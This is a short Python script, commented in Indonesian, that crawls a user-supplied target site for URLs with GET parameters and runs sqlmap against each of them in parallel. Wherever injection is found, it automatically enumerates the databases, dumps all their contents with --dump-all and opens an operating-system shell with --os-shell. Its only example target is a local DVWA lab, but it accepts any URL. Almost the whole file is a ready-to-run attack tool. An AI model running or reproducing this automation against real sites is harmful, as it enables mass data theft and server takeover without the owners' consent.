import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import subprocess
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

# Konfigurasi
CRAWL_LIMIT = 100        # Batas halaman yang di-crawl
MAX_THREADS = 10         # Jumlah thread paralel
SQLMAP_PATH = "sqlmap"   # Pastikan sqlmap ada di PATH

VISITED = set()
URLS_WITH_PARAMS = []

def crawl(url, target_domain):
    """Merayapi URL dan mencari parameter GET"""
    if len(VISITED) >= CRAWL_LIMIT or url in VISITED:
        return
    try:
        response = requests.get(url, timeout=5)
    except:
        return

    VISITED.add(url)
    print(f"[Crawl] {url}")

    soup = BeautifulSoup(response.text, "html.parser")
    for link_tag in soup.find_all("a", href=True):
        link = urljoin(url, link_tag["href"])
        parsed = urlparse(link)

        if target_domain in link and link not in VISITED:
            if parsed.query:  # Ada parameter GET
                URLS_WITH_PARAMS.append(link)
            crawl(link, target_domain)

def test_sqlmap(url):
    """Menguji URL dengan SQLMap"""
    print(f"\n[+] Menguji kerentanan SQLi: {url}")
    check_cmd = [
        SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "--random-agent"
    ]
    result = subprocess.run(check_cmd, capture_output=True, text=True)

    if re.search(r"the back-end DBMS", result.stdout, re.IGNORECASE):
        print(f"[!!!] Rentan SQLi ditemukan: {url}")
        run_full_sqlmap(url)
    else:
        print(f"[-] Tidak rentan: {url}")

def run_full_sqlmap(url):
    """Menjalankan semua fitur SQLMap ke URL rentan"""
    commands = [
        [SQLMAP_PATH, "-u", url, "--batch", "--dbs"],
        [SQLMAP_PATH, "-u", url, "--batch", "--dump-all"],
        [SQLMAP_PATH, "-u", url, "--batch", "--os-shell"]
    ]
    for cmd in commands:
        subprocess.run(cmd)

if __name__ == "__main__":
    # Input URL target dari user
    TARGET = input("Masukkan URL target (contoh: http://localhost/dvwa/): ").strip()
    if not TARGET.startswith("http"):
        print("[!] URL harus diawali http:// atau https://")
        exit()

    TARGET_DOMAIN = urlparse(TARGET).netloc

    print("[*] Mulai crawling...")
    crawl(TARGET, TARGET_DOMAIN)

    print(f"\n[!] Total URL dengan parameter ditemukan: {len(URLS_WITH_PARAMS)}")

    # Uji semua URL dengan multi-thread
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(test_sqlmap, url) for url in URLS_WITH_PARAMS]
        for future in as_completed(futures):
            future.result()
